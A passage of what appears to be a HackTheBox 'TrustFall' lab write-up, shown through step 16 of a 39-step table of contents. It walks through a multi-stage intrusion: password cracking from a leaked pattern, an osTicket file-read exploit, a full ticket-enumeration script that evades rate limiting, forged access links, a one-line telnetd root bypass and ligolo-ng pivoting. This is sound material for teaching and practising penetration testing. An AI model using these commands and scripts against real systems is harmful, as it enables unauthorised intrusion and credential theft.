# TrustFall — HackTheBox (Insane, Active Directory / Windows + Linux)

**Difficulty:** Insane
**OS:** Windows (Active Directory) with a Linux edge host
**Domain:** `trustfall.htb`

> Note on redaction: the target's public IP is shown as `10.129.xx.xx` and the attacker VPN IP as `10.10.xx.xx` throughout. All cracked passwords, hashes, and flag contents have been replaced with `[REDACTED]`. Internal pivot-network addresses (the `192.168.1.0/24` range reached later through the tunnel) are left as-is since they are not the HTB-assigned target/VPN addresses.

---

## Table of Contents

1. [Initial Recon (nmap)](#1-initial-recon-nmap)
2. [Anonymous FTP Enumeration](#2-anonymous-ftp-enumeration)
3. [Analyzing the Mail Migration Backup](#3-analyzing-the-mail-migration-backup)
4. [Building a Targeted Wordlist & Cracking the Dovecot Hashes](#4-building-a-targeted-wordlist--cracking-the-dovecot-hashes)
5. [Virtual Host Discovery](#5-virtual-host-discovery)
6. [osTicket — CVE-2026-22200 Arbitrary File Read](#6-osticket--cve-2026-22200-arbitrary-file-read)
7. [Leaking osTicket's Database Credentials](#7-leaking-osticket's-database-credentials)
8. [Bruteforcing Valid Ticket/Email Combos](#8-bruteforcing-valid-ticketemail-combos)
9. [Forging a Ticket Access Link & Grabbing an SSH Key](#9-forging-a-ticket-access-link--grabbing-an-ssh-key)
10. [Foothold as martin](#10-foothold-as-martin)
11. [Privilege Escalation — CVE-2026-24061 (GNU inetutils telnetd)](#11-privilege-escalation--cve-2026-24061-gnu-inetutils-telnetd)
12. [Apache Logs → Discovering the Internal Network](#12-apache-logs--discovering-the-internal-network)
13. [Reading the osTicket Database for Internal Intel](#13-reading-the-osticket-database-for-internal-intel)
14. [Pivoting with ligolo-ng](#14-pivoting-with-ligolo-ng)
15. [Scanning the Internal Network](#15-scanning-the-internal-network)
16. [Impersonating WS02 to Capture an RDP Login](#16-impersonating-ws02-to-capture-an-rdp-login)
17. [NTLM Relay to AD CS Web Enrollment (ESC8-style)](#17-ntlm-relay-to-ad-cs-web-enrollment-esc8-style)
18. [Authenticating as david.m & Running BloodHound](#18-authenticating-as-davidm--running-bloodhound)
19. [Abusing GenericWrite on the Leadership Group](#19-abusing-genericwrite-on-the-leadership-group)
20. [AS-REP Roasting luis.mody](#20-as-rep-roasting-luismody)
21. [Cracking the AS-REP Hash with a Targeted Wordlist](#21-cracking-the-as-rep-hash-with-a-targeted-wordlist)
22. [Taking Over luis.mody & Abusing OU Permissions](#22-taking-over-luismody--abusing-ou-permissions)
23. [WinRM Access as jake.r on WS01](#23-winrm-access-as-jaker-on-ws01)
24. [Finding MinIO Credentials in a WinSCP Config File](#24-finding-minio-credentials-in-a-winscp-config-file)
25. [Pulling a Credential Backup from MinIO](#25-pulling-a-credential-backup-from-minio)
26. [Decrypting the Credential Backup with Mimikatz](#26-decrypting-the-credential-backup-with-mimikatz)
27. [Password Reuse Check → sql_svc](#27-password-reuse-check--sql_svc)
28. [BloodHound: sql_svc → IT Group → WebServer-HTTPS Template](#28-bloodhound-sql_svc--it-group--webserver-https-template)
29. [Requesting a WebServer-HTTPS Certificate for the WSUS Attack](#29-requesting-a-webserver-https-certificate-for-the-wsus-attack)
30. [Setting Up a Proxy on the Pivot Host](#30-setting-up-a-proxy-on-the-pivot-host)
31. [WSUS MITM Attack (wsuks) → Local Admin on WS01](#31-wsus-mitm-attack-wsuks--local-admin-on-ws01)
32. [User Flag & Dumping the Local SAM/LSA Secrets](#32-user-flag--dumping-the-local-samlsa-secrets)
33. [Local Hash Reuse → tom.k on the Domain Controller](#33-local-hash-reuse--tomk-on-the-domain-controller)
34. [Finding a Weak Password-Reset Script (Reset-User.vbs)](#34-finding-a-weak-password-reset-script-reset-uservbs)
35. [Reconstructing the VBScript `Randomize` Seed](#35-reconstructing-the-vbscript-randomize-seed)
36. [Cracking aaron.b's Password from Regenerated Candidates](#36-cracking-aaronbs-password-from-regenerated-candidates)
37. [ESC7 — Abusing ManageCA on the Enterprise CA](#37-esc7--abusing-manageca-on-the-enterprise-ca)
38. [Domain Administrator & Root Flag](#38-domain-administrator--root-flag)
39. [Step-by-Step Summary](#39-step-by-step-summary)

---

## 1. Initial Recon (nmap)

Standard full TCP scan with version/script detection against the box:

```bash
nmap -sV -sC 10.129.xx.xx
```

```
Nmap scan report for 10.129.xx.xx
Host is up (0.48s latency).
Not shown: 978 filtered tcp ports (no-response)
PORT      STATE  SERVICE       VERSION
21/tcp    open   ftp           vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp    open   ssh           OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
53/tcp    open   domain        Simple DNS Plus
80/tcp    open   http          Apache httpd 2.4.58
|_http-title: Did not follow redirect to http://trustfall.htb/
88/tcp    open   kerberos-sec  Microsoft Windows Kerberos
135/tcp   open   msrpc         Microsoft Windows RPC
139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open   ldap          Microsoft Windows Active Directory LDAP (Domain: trustfall.htb, Site: Default-First-Site-Name)
443/tcp   open   ssl/https?
445/tcp   open   microsoft-ds?
464/tcp   open   kpasswd5?
593/tcp   open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open   ssl/ldap      Microsoft Windows Active Directory LDAP
2179/tcp  open   vmrdp?
3268/tcp  open   ldap          Microsoft Windows Active Directory LDAP (Global Catalog)
3269/tcp  open   ssl/ldap      Microsoft Windows Active Directory LDAP (Global Catalog)
5985/tcp  open   http          Microsoft HTTPAPI httpd 2.0 (WinRM)
Service Info: Hosts: catch-all, DC01; OSs: Unix, Linux, Windows
```

**Key takeaway:** this single IP is answering for *both* a Linux box (FTP/SSH/Apache) and a Windows Domain Controller (Kerberos/LDAP/SMB/WinRM). The `Host script results` also flag SMB signing as required, and the cert Subject Alternative Names reveal the hostnames `dc01.trustfall.htb` and the CA name `trustfall-DC01-CA`. All of this went into `/etc/hosts`:

```
10.129.xx.xx    trustfall.htb dc01.trustfall.htb dc01 trustfall-DC01-CA
```

---

## 2. Anonymous FTP Enumeration

Anonymous FTP login was allowed, so it was checked immediately:

```bash
ftp 10.129.xx.xx
```

```
Name (10.129.xx.xx:kali): anonymous
230 Login successful.
```

Directory listing revealed four folders:

```
drwxr-xr-x    2 ftp      ftp          4096 Feb 15  2026 IT-Archives
drwxr-xr-x    2 ftp      ftp          4096 Apr 13 16:36 backups
drwxr-xr-x    2 ftp      ftp          4096 Feb 15  2026 incoming
drwxr-xr-x    2 ftp      ftp          4096 Feb 15  2026 public
```

- `IT-Archives/migration_notes.txt` — a small text note.
- `backups/mail_migration_rollback_backup.tar.gz` — the interesting one.
- `incoming/` and `public/` — empty.

Both files were pulled down with `get`.

`migration_notes.txt`:

```
TrustFall Mail Migration – Archive

Old Dovecot flat-file auth stored for rollback purposes.
To be deleted after full SQL transition.

-- IT Department
```

This is a hint that the tar.gz contains old authentication data that "should" have been deleted.

---

## 3. Analyzing the Mail Migration Backup

```bash
gunzip mail_migration_rollback_backup.tar.gz
tar -xvf mail_migration_rollback_backup.tar
```

```
mail_migration_backup_2026/
mail_migration_backup_2026/roundcube_users_dump.sql
mail_migration_backup_2026/README_migration_notes.txt
mail_migration_backup_2026/dovecot-users
mail_migration_backup_2026/roundcube_config_old.php
```

**`dovecot-users`** — an old flat-file Dovecot auth database containing MD5-crypt password hashes for three mailboxes:

```
santiago@trustfall.htb:{MD5-CRYPT}$1$GzCoHeLN$[REDACTED]:5000:5000::/var/mail/santiago::
alejandro@trustfall.htb:{MD5-CRYPT}$1$qg8ddOwy$[REDACTED]:5000:5000::/var/mail/alejandro::
salvador@trustfall.htb:{MD5-CRYPT}$1$ABiYCRsS$[REDACTED]:5000:5000::/var/mail/salvador::
```

**`README_migration_notes.txt`** — this is the file that made the whole box crackable. It documented the company's password *pattern* used during a migration test, along with two literal examples:

```
TrustFall Mail Migration Notes – January 2026

- Migrated mailboxes from old Dovecot auth file to SQL backend.
- Old auth file kept temporarily for rollback.
- Ensure backup is removed after 30 days.

Temporary credentials used during testing:
example@trustfall.htb
Password pattern: CompanyName + DEPARTMENT + FirstName + BirthYear + !

Example: TrustFallITMostafa1997! / TrustFallSALESGabriel979!

-- IT Department
```

**`roundcube_config_old.php`** — Roundcube webmail's old config file, leaking a MySQL DSN, SMTP settings, and a DES key (all redacted here):

```php
$config['db_dsnw'] = 'mysql://roundcube:[REDACTED]@localhost/roundcube';
$config['default_host'] = 'localhost';
$config['smtp_server'] = 'localhost';
$config['smtp_user'] = '%u';
$config['smtp_pass'] = '%p';
$config['des_key'] = '[REDACTED]';
```

**`roundcube_users_dump.sql`** — three shared/service mailboxes:

```sql
INSERT INTO users (username, mail_host) VALUES
('support@trustfall.htb', 'localhost'),
('hr@trustfall.htb', 'localhost'),
('it@trustfall.htb', 'localhost');
```

So at this point there were three real usernames (`santiago`, `alejandro`, `salvador`) with hashed passwords, and a documented, very specific password-construction pattern to try against them.

---

## 4. Building a Targeted Wordlist & Cracking the Dovecot Hashes

Instead of a generic wordlist, a small Python script generated every combination of the documented pattern (`TrustFall + DEPARTMENT + FirstName + BirthYear + !`) for the three known first names, across nine plausible departments and forty years of birth:

```python
#!/usr/bin/env python3
names = ["Santiago", "Alejandro", "Salvador"]
departments = ["HR", "IT", "SALES", "MARKETING", "FINANCE", "SUPPORT", "LEGAL", "ADMIN", "OPERATIONS"]
years = range(1970, 2010)

with open("targeted_wordlist.txt", "w") as f:
    for name in names:
        for dept in departments:
            for year in years:
                f.write(f"TrustFall{dept}{name}{year}!\n")
```

```bash
python3 create_wordlist.py
head targeted_wordlist.txt -n 5 && tail targeted_wordlist.txt -n 5
```

```
TrustFallHRSantiago1970!
TrustFallHRSantiago1971!
...
TrustFallOPERATIONSSalvador2008!
TrustFallOPERATIONSSalvador2009!
```

This produced only **1,080** candidate passwords — small and highly targeted, versus millions in a generic list. Cracking the three MD5-crypt (`-m 500`) hashes with hashcat took seconds:

```bash
hashcat -m 500 hash targeted_wordlist.txt
```

```
$1$GzCoHeLN$[REDACTED]:TrustFallMARKETINGSantiago[REDACTED]!
$1$ABiYCRsS$[REDACTED]:TrustFallHRSalvador[REDACTED]!
$1$qg8ddOwy$[REDACTED]:TrustFallFINANCEAlejandro[REDACTED]!
...
Recovered........: 3/3 (100.00%) Digests (total), 3/3 (100.00%) Digests (new), 3/3 (100.00%) Salts
```

All three mail passwords cracked in under a second because the *pattern itself* was leaked in the backup — a good example of why "documenting a password scheme for testing" and then leaving the doc lying around is dangerous.

---

## 5. Virtual Host Discovery

The web server on port 80 redirects to `trustfall.htb`, so vhost fuzzing was run against the `Host` header:

```bash
ffuf -u http://trustfall.htb -H "HOST:FUZZ.trustfall.htb" \
     -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -fw 18
```

```
ticket                  [Status: 200, Size: 4967, Words: 787, Lines: 103, Duration: 328ms]
mailsrv                 [Status: 200, Size: 5311, Words: 364, Lines: 97, Duration: 299ms]
```

Added to `/etc/hosts`:

```
10.129.xx.xx    trustfall.htb dc01.trustfall.htb dc01 trustfall-DC01-CA ticket.trustfall.htb mailsrv.trustfall.htb
```

- `http://ticket.trustfall.htb` → osTicket support portal.
- `http://mailsrv.trustfall.htb` → Roundcube webmail.

**Password reuse check #1:** the three cracked mail passwords were tried against Roundcube. Only **salvador's** credentials worked — but his mailbox was empty (no mail to read there). This ruled out `santiago`/`alejandro` for webmail and pointed further effort at osTicket, where salvador's login could still be used.

---

## 6. osTicket — CVE-2026-22200 Arbitrary File Read

osTicket was fingerprinted and checked against a known CVE: **CVE-2026-22200**, an arbitrary file read vulnerability in osTicket that abuses malicious PHP filter chains during PDF ticket export, exploitable pre-authentication.

Reference: [https://github.com/horizon3ai/CVE-2026-22200](https://github.com/horizon3ai/CVE-2026-22200)

A checker script confirmed the target was vulnerable:

```bash
python3 check.py http://ticket.trustfall.htb
```

```
[*] Checking account registration endpoint...
 [!] Account registration appears ENABLED
[*] Testing login validation...
 [!] VULNERABLE - Server returned: "Access denied"
[!] Target is LIKELY VULNERABLE to CVE-2026-22200
[!] Recommend upgrading to osTicket v1.18.3+ or v1.17.7+
[!] Target is LIKELY EXPLOITABLE by anonymous attackers
```

There is also a Metasploit auxiliary module for this exploit: `auxiliary/gather/osticket_arbitrary_file_read`. It was configured to authenticate as `salvador@trustfall.htb` using his cracked mail password (reused here on the client portal), create a ticket, embed the PHP filter-chain payload in a reply, export the ticket as a PDF, and parse the requested file back out of the PDF:

```
msf auxiliary(gather/osticket_arbitrary_file_read) > set FILE /etc/passwd
msf auxiliary(gather/osticket_arbitrary_file_read) > set USERNAME salvador@trustfall.htb
msf auxiliary(gather/osticket_arbitrary_file_read) > set PASSWORD [REDACTED]
msf auxiliary(gather/osticket_arbitrary_file_read) > run
```

```
[+] do_login: Client portal login succeeded, cookies=OSTSESSID=...
[+] Authenticated via client portal
[+] Created ticket # (internal ID: 11)
[*] Generating PHP filter chain payload...
[+] Reply posted successfully
[*] Downloading ticket PDF...
[+] PDF downloaded (55102 bytes)
[*] Extracting file from PDF...
[+] Extracted 2183 bytes

--- [/etc/passwd] (2183 bytes) ---
root:x:0:0:root:/root:/bin/bash
...
martin:x:1000:1000:ticket01:/home/martin:/bin/bash
...
vmail:x:5000:5000:virtual mail user:/var/mail/vhosts:/bin/sh
ftp:x:110:110:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
```

This confirmed the Linux host behind the vhost is named `ticket01`, has a normal user `martin`, and runs the full mail stack (postfix/dovecot) plus FTP.

---

## 7. Leaking osTicket's Database Credentials

Using the same arbitrary-file-read primitive, osTicket's own static config file was pulled via a `/proc/self/cwd/...` relative path trick (bypassing needing the absolute install path):

```
msf auxiliary(gather/osticket_arbitrary_file_read) > set FILE /proc/self/cwd/include/ost-config.php
msf auxiliary(gather/osticket_arbitrary_file_read) > run
```

```
--- [/proc/self/cwd/include/ost-config.php] (6338 bytes) ---
define('SECRET_SALT','[REDACTED]');
define('ADMIN_EMAIL','ebrooks@trustfall.htb');
define('DBTYPE','mysql');
define('DBHOST','localhost');
define('DBNAME','osticket');
define('DBUSER','osticket_user');
define('DBPASS','[REDACTED]');
define('TABLE_PREFIX','ost_');
```

**Key findings:**

| Item | Value |
|---|---|
| `SECRET_SALT` | `[REDACTED]` — used by osTicket to sign ticket access links |
| `ADMIN_EMAIL` | `ebrooks@trustfall.htb` |
| `DBUSER` / `DBPASS` | `osticket_user` / `[REDACTED]` — later used directly on the box |

The `SECRET_SALT` is the important one: osTicket computes an `a=` hash parameter for its passwordless "email me a ticket link" feature using this salt plus the ticket ID and email. Leaking the salt means access links can be **forged offline** for any ticket ID/email pair, without ever receiving the email.

---

## 8. Bruteforcing Valid Ticket/Email Combos

Before a link can be forged, a *valid* ticket number tied to a *known* email is needed. osTicket's guest ticket lookup format for this instance was `TrustFall_TKxx`. A small multi-threaded Python script (`osticket_access_bruteforce.py`) was written to:

1. `GET /login.php` to grab a CSRF token.
2. `POST` a ticket number + email pair to the lookup form.
3. Detect success by looking for "access link sent to your email" or a redirect to `tickets.php`.
4. Recycle sessions every 2 requests to dodge basic session-based rate limiting.

```python
#!/usr/bin/env python3
"""
osTicket Ticket Access Link Brute Force Script (TrustFall_TKxx format)
======================================================================
Attempts to enumerate valid ticket number + email combinations by requesting
access links through the login.php endpoint.
Usage: python osticket_access_bruteforce.py <base_url> <email> [--start START] [--end END]
Example: python osticket_access_bruteforce.py http://ticket.trustfall.htb santiago@trustfall.htb --start 1 --end 50
"""
import re
import argparse
import time
import threading
from datetime import datetime
from queue import Queue
from urllib.parse import urljoin
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

requests.packages.urllib3.disable_warnings()

class Colors:
    """ANSI color codes for terminal output"""
    HEADER = '033[95m'
    OKBLUE = '033[94m'
    OKCYAN = '033[96m'
    OKGREEN = '033[92m'
    WARNING = '033[93m'
    FAIL = '033[91m'
    ENDC = '033[0m'
    BOLD = '033[1m'

def print_banner():
    """Print script banner"""
    print(f"{Colors.HEADER}{Colors.BOLD}")
    print("=" * 70)
    print("osTicket Ticket Access Link Enumeration Script (TrustFall_TKxx)")
    print("=" * 70)
    print(f"{Colors.ENDC}")

def create_session():
    """Create a requests session with retry logic"""
    session = requests.Session()
    retry = Retry(total=3, backoff_factor=0.5, status_forcelist=[500, 502, 503, 504])
    adapter = HTTPAdapter(max_retries=retry)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    session.verify = False
    return session

def extract_csrf_token(content):
    """Extract __CSRFToken__ from HTML content"""
    match = re.search(r'name=["\']__CSRFToken__["\'][^>]*value=["\']([^"\']+)["\']', content)
    return match.group(1) if match else None

def check_ticket_access(base_url, email, ticket_number, session):
    """
    Attempts to request a ticket access link for a given ticket number and email.
    Returns (success: bool, message: str)
    """
    login_url = urljoin(base_url, 'login.php')
    try:
        # 1. GET the login page to get a valid CSRF token
        resp_get = session.get(login_url)
        if resp_get.status_code != 200:
            return False, f"Failed to load login page (HTTP {resp_get.status_code})"
        csrf_token = extract_csrf_token(resp_get.text)
        if not csrf_token:
            return False, "Could not find CSRF token"

        # 2. POST the ticket access request
        payload = {
            '__CSRFToken__': csrf_token,
            'lticket': str(ticket_number),
            'lemail': email,
        }
        resp_post = session.post(login_url, data=payload, allow_redirects=False)
        response_content = resp_post.text

        # Check for success indicators
        if "access link sent to your email" in response_content.lower():
            return True, "Access link sent (email verification required)"

        # Check if redirected to tickets.php (immediate access granted)
        if resp_post.status_code in [301, 302, 303, 307, 308]:
            location = resp_post.headers.get('Location', '')
            if 'tickets.php' in location:
                return True, "Access granted (redirected to tickets.php)"

        # Check for explicit failure messages
        if "invalid email or ticket number" in response_content.lower():
            return False, "Invalid combination"
        if "access denied" in response_content.lower():
            return False, "Access denied"

        # Ambiguous response
        return False, "Unknown response (possibly rate limited or error)"
    except requests.RequestException as e:
        return False, f"Network error: {e}"

def main():
    parser = argparse.ArgumentParser(
        description='Enumerate valid TrustFall_TKxx ticket number + email combinations in osTicket.',
        epilog='Example: python osticket_access_bruteforce.py http://ticket.trustfall.htb santiago@trustfall.htb --start 1 --end 50'
    )
    parser.add_argument('base_url', help='Base URL of the osTicket installation (e.g., http://ticket.trustfall.htb)')
    parser.add_argument('email', help='Email address to test')
    parser.add_argument('--start', type=int, default=1, help='Starting numeric suffix (default: 1)')
    parser.add_argument('--end', type=int, default=50, help='Ending numeric suffix (default: 50)')
    parser.add_argument('--delay', type=float, default=0.5, help='Delay between requests in seconds (default: 0.5)')
    parser.add_argument('--threads', type=int, default=1, help='Number of concurrent threads (default: 1)')
    parser.add_argument('--no-color', action='store_true', help='Disable colored output')
    parser.add_argument('--output', '-o', help='Output file to log valid combinations')
    parser.add_argument('--pad', type=int, default=0, help='Zero-pad the numeric suffix to this width (e.g. 2 → TK01). Default: no padding')
    args = parser.parse_args()

    if args.no_color:
        for attr in dir(Colors):
            if not attr.startswith('_'):
                setattr(Colors, attr, '')

    base_url = args.base_url
    if not base_url.endswith('/'):
        base_url += '/'

    print_banner()
    print(f"Target:        {Colors.BOLD}{base_url}{Colors.ENDC}")
    print(f"Email:         {Colors.BOLD}{args.email}{Colors.ENDC}")
    print(f"Ticket Range:  {Colors.BOLD}TrustFall_TK{args.start} - TrustFall_TK{args.end}{Colors.ENDC}")
    print(f"Delay:         {Colors.BOLD}{args.delay}s{Colors.ENDC}")
    print(f"Threads:       {Colors.BOLD}{args.threads}{Colors.ENDC}")
    if args.pad:
        print(f"Padding:       {Colors.BOLD}{args.pad} digits{Colors.ENDC}")
    print()

    start_time = datetime.now()
    print(f"{Colors.OKCYAN}[*] Scan started at: {start_time.strftime('%Y-%m-%d %H:%M:%S')}{Colors.ENDC}")
    print()

    # Thread-safe counters and results
    valid_tickets = []
    valid_lock = threading.Lock()
    stats_lock = threading.Lock()
    stats = {'processed': 0, 'found': 0}

    # Create work queue with TrustFall_TKxx format
    work_queue = Queue()
    for num in range(args.start, args.end + 1):
        if args.pad > 0:
            ticket = f"TrustFall_TK{num:0{args.pad}d}"
        else:
            ticket = f"TrustFall_TK{num}"
        work_queue.put(ticket)

    total = args.end - args.start + 1

    def worker():
        """Worker thread function - processes 2 tickets per session"""
        session = None
        requests_in_session = 0
        while True:
            try:
                ticket_number = work_queue.get_nowait()
            except:
                break

            # Create a fresh session every 2 requests to bypass session-based rate limiting
            if session is None or requests_in_session >= 2:
                session = create_session()
                requests_in_session = 0

            success, message = check_ticket_access(base_url, args.email, ticket_number, session)
            requests_in_session += 1

            with stats_lock:
                stats['processed'] += 1
                processed = stats['processed']

                if success:
                    stats['found'] += 1
                    found = stats['found']
                    with valid_lock:
                        valid_tickets.append((ticket_number, message))
                    print(f"{Colors.OKGREEN}[+] VALID:{Colors.ENDC} Ticket {ticket_number} - {message}")

                    # Log to output file if specified
                    if args.output:
                        with open(args.output, 'a') as f:
                            f.write(f"{ticket_number},{args.email},{message}n")
                else:
                    found = stats['found']

                    # Only print every 10th failure to reduce noise (smaller range)
                    if processed % 10 == 0:
                        print(f"{Colors.OKCYAN}[i] Progress: {processed}/{total} tested, {found} valid found{Colors.ENDC}")

            # Rate limiting
            time.sleep(args.delay)
            work_queue.task_done()

    # Start worker threads
    threads = []
    for i in range(args.threads):
        t = threading.Thread(target=worker)
        t.start()
        threads.append(t)

    # Wait for all threads to complete
    for t in threads:
        t.join()

    end_time = datetime.now()
    duration = end_time - start_time

    print()
    print(f"{Colors.OKCYAN}[*] Scan completed at: {end_time.strftime('%Y-%m-%d %H:%M:%S')}{Colors.ENDC}")
    print(f"{Colors.OKCYAN}[*] Total duration: {duration}{Colors.ENDC}")
    print()
    print(f"{Colors.OKBLUE}[*] Scan complete.{Colors.ENDC}")
    print(f"    Total tested: {stats['processed']}")
    print(f"    Valid found:  {stats['found']}")

    if valid_tickets:
        print()
        print(f"{Colors.OKGREEN}Valid ticket numbers:{Colors.ENDC}")

        # Sort by the numeric part
        valid_tickets.sort(key=lambda x: int(re.search(r'd+', x[0]).group()))

        for ticket_num, msg in valid_tickets:
            print(f"  - {ticket_num}: {msg}")

        if args.output:
            print()
            print(f"{Colors.OKCYAN}Results saved to: {args.output}{Colors.ENDC}")

if __name__ == '__main__':
    main()
```
```bash
python3 brute.py http://ticket.trustfall.htb santiago@trustfall.htb --start 1 --end 30 --pad 2
```

```
[+] VALID: Ticket TrustFall_TK13 - Access link sent (email verification required)
...
Total tested: 30
Valid found:  1
Valid ticket numbers:
  - TrustFall_TK13: Access link sent (email verification required)
```

So ticket `TrustFall_TK13` (internal numeric ID **3**, confirmed later) belongs to `santiago@trustfall.htb`.

---

## 9. Forging a Ticket Access Link & Grabbing an SSH Key

With the internal ticket ID, the victim email, and the leaked `SECRET_SALT`, the access-link hash (`a=` parameter) was computed locally and used to open the ticket directly — no email required:

```bash
python3 osticket_forge_access_link.py TrustFall_TK13 3 santiago@trustfall.htb '[REDACTED-SECRET_SALT]' http://ticket.trustfall.htb
```

```
[*] Calculating hash for ID: 3, Email: santiago@trustfall.htb...
[*] Calculated Hash (a): [REDACTED]
[*] Sending GET request to: http://ticket.trustfall.htb/view.php
[*] Request Parameters: {'t': 'TrustFall_TK13', 'e': 'santiago@trustfall.htb', 'a': '[REDACTED]'}
Full URL Sent: http://ticket.trustfall.htb/tickets.php?id=3
Status Code: 200
```

The returned ticket thread (posted by `santiago`) was an SSH help-desk request — and it perfectly explains why this ticket is useful:

> *"I'm unable to SSH into ticket01.trustfall.htb after the recent migration ... I suspect the key might be corrupted. I regenerated it but still facing issues. Attaching my current .ssh folder for review."*

Attached to the ticket was `ssh_debug.tar.gz` — santiago's **entire `.ssh` folder**, including his private key, uploaded to a public support ticket by mistake. It was downloaded via the same `file.php?key=...` download link embedded in the ticket HTML.

```bash
ls -la .ssh
```

```
-rw-------  1 kali kali   97 Feb 18  2026 authorized_keys
-rw-------  1 kali kali  411 Feb 18  2026 id_ed25519
-rw-r--r--  1 kali kali   97 Feb 18  2026 id_ed25519.pub
```

---

## 10. Foothold as martin

Interestingly, the leaked SSH key belonged to `santiago`'s own machine setup, but it was authorized to log in as **martin** on the ticket server (its `authorized_keys` matched martin's account):

```bash
ssh -i .ssh/id_ed25519 martin@10.129.xx.xx
```

```
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-137-generic x86_64)
Last login: Thu Jun 18 2026 from 10.10.xx.xx
martin@ticket01:~$
```

Low-privilege shell obtained as `martin` on `ticket01`.

---

## 11. Privilege Escalation — CVE-2026-24061 (GNU inetutils telnetd)

A quick look at listening services showed telnet (port 23) bound locally:

```bash
ss -tulnp
```

```
tcp   LISTEN   0   128   0.0.0.0:23    0.0.0.0:*
tcp   LISTEN   0   128      [::]:23       [::]:*
```

```bash
telnet --version
```

```
telnet (GNU inetutils) 2.5
```

This version is affected by **CVE-2026-24061** — a critical authentication bypass / remote code execution vulnerability in GNU Inetutils `telnetd` (versions 1.9.3 through 2.7). The bug lets an attacker control the `USER` environment variable passed by the telnet client, which telnetd feeds into the login program unsanitized; setting `USER` to `-f root` tricks `login`'s argument parsing into auto-authenticating as root (the `-f` flag means "skip password, force login as this user").

```bash
env USER='-f root' telnet -a 127.0.0.1 23
```

```
Trying 127.0.0.1...
Connected to 127.0.0.1.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. ...
root@ticket01:~#
```

Root on `ticket01` obtained.

---

## 12. Apache Logs → Discovering the Internal Network

As root, the Apache vhost logs were reviewed for historical/internal traffic clues:

```bash
cd /var/log/apache2 && ls
cat access.log.1
```

```
192.168.1.110 - - [31/Jan/2026:...] "GET /osticket HTTP/1.1" 301 584 "-" "Mozilla/5.0 ..."
```

The `192.168.1.0/24` range showed up repeatedly — a second, internal network this Linux box is dual-homed on. Checking interfaces confirmed a second NIC:

```bash
ip a s
```

```
2: eth0: <BROADCAST,MULTICAST> mtu 1500 state DOWN
    link/ether 00:15:5d:b3:46:00
3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 state UP
    inet 10.10.10.20/24 brd 10.10.10.255 scope global eth1
```

`eth0` (the internal 192.168.1.0/24 leg) existed but was administratively down — so it was brought up:

```bash
ip link set eth0 up
```

A quick host sweep found two live internal hosts:

```bash
for i in {1..255}; do (ping -c 1 192.168.1.$i | grep "bytes from" &) ; done
```

```
64 bytes from 192.168.1.32: icmp_seq=0 ttl=127 time=1.621 ms
64 bytes from 192.168.1.64: icmp_seq=0 ttl=127 time=1.106 ms
```

---

## 13. Reading the osTicket Database for Internal Intel

With the DB credentials leaked earlier (`osticket_user` / `[REDACTED]`), the local MariaDB instance was queried directly for anything mentioning the internal hosts:

```bash
mysql -u osticket_user -p'[REDACTED]' osticket
```

```sql
SELECT thread_id, body FROM ost_thread_entry
WHERE body LIKE '%WS01%' OR body LIKE '%DC01%'
   OR body LIKE '%Domain Controller%' OR body LIKE '%Active Directory%'
   OR body LIKE '%IP address%';
```

Two very useful support tickets came back:

- **Thread 5** — a user ("David") reporting he **cannot RDP from WS01.trustfall.htb to WS02.trustfall.htb**, and says he "will continue attempting to connect periodically" — this is a huge hint that an RDP login attempt to WS02 will recur.
- **Thread 6** — a user ("Luis", account `Luis.m`, machine `WS01.trustfall.htb`) locked out of the domain, asking IT to check his AD account status.

192.168.1.32 = `192.168.1.32` (later confirmed as DC01's internal NIC), 192.168.1.64 = `ws01.trustfall.htb`. `/etc/hosts` was updated:

```
10.129.xx.xx   ticket.trustfall.htb mailsrv.trustfall.htb
192.168.1.32   trustfall.htb dc01.trustfall.htb dc01 trustfall-DC01-CA
192.168.1.64   ws01.trustfall.htb ws01
```
---

## 14. Pivoting with ligolo-ng

Rather than only port-forwarding one service at a time, a full tunnel into the `192.168.1.0/24` segment was established using **ligolo-ng**, with a listener on the attacker box and an agent pushed to `ticket01`.

Attacker side:

```bash
sudo ./proxy -selfcert
```

```
INFO[0000] Listening on 0.0.0.0:11601
ligolo-ng » ifcreate --name trustfall
ligolo-ng » route_add --name trustfall --route 192.168.1.32/32
ligolo-ng » route_add --name trustfall --route 192.168.1.64/32
```

Agent side (on `ticket01`, as root):

```bash
./agent -connect 10.10.xx.xx:11601 --ignore-cert &
```

```
INFO[0000] Connection established   addr="10.10.xx.xx:11601"
```

Back on the proxy console:

```
ligolo-ng » session
? Specify a session : 1 - root@ticket01 - 10.129.xx.xx:50108 - 00155db34600
[Agent : root@ticket01] » tunnel_start --tun trustfall
INFO[0241] Starting tunnel to root@ticket01
```

The attacker box now has routed access to `192.168.1.0/24` as if it were locally connected.


DNS was also queried directly against the DC to resolve **WS02**, which hadn't answered the ping sweep:

```bash
dig @192.168.1.32 ws02.trustfall.htb ANY
```

```
;; ANSWER SECTION:
ws02.trustfall.htb.     1200    IN      A       192.168.1.37
```

`.37` didn't respond to ICMP — meaning **WS02 is currently offline**. Combined with ticket #5 (David periodically retrying RDP to WS02), this set up the next move: **spoof WS02's IP on the pivot box and let David RDP straight into an attacker-controlled listener.**

---

## 15. Scanning the Internal Network

A full nmap scan through the tunnel against DC01's internal address confirmed a standard, hardened Domain Controller (Windows Server, Kerberos, LDAP/LDAPS, SMB signing required, ADCS present via the `trustfall-DC01-CA` certificate CN):

```bash
nmap -sV -sC 192.168.1.32
```

```
88/tcp    open   kerberos-sec
389/tcp   open   ldap          ... Domain: trustfall.htb
445/tcp   open   microsoft-ds?
3268/tcp  open   ldap          (Global Catalog)
5985/tcp  open   http          Microsoft HTTPAPI httpd 2.0 (WinRM)
```

---

## 16. Impersonating WS02 to Capture an RDP Login

Recall: WS02 (`192.168.1.37`) is offline, and David (WS01) is periodically retrying an RDP connection to it. The plan:

1. Statically assign WS02's IP to the attacker-controlled `ticket01` interface.
2. Confirm inbound RDP connections actually arrive.
